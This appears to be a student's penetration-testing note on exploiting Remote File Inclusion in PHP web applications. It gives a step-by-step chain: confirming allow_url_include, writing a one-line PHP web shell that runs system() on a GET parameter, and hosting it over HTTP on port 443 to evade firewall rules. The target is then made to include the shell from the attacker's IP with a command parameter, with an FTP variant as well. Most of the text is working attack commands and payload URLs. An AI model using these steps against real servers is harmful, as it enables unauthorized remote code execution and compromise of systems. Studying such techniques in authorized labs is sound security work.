> Almost any RFI is also an LFI but not necessarily vice versa
1. Enumerating local-only ports and web applications (i.e SSRF)
2. Gaining remote code execution by including a malicious script that we host

## Verify RFI
-  Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled.
- we can check this similar to how we did for LFI refer to the LFI note ([[1. Local File Inclusion]])for additional details
```python
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include allow_url_include = On
```
- A more reilable way to confirm if an LFI is also vulnerable to RFI is trying to include a  URL.
- In order to not trigger the firewall, lets just test by including a local file : 
```python
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

## Remote Code Execution with RFI
**Step 1**: Create the malicious script for remote code execution in the language of the web app.
```python
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
**Step 2**: Host this script and include it through the RFI vuln.
>Its  a good idea to listen on ports 80 or 443 since these ports might be whitelisted in the web app firewall.

```python
sudo python3 -m http.server 443
```
**Step 3**: Include our local shell through RFI
```python
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

## FTP

```python
sudo python -m pyftpdlib -p 21
```

```python
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
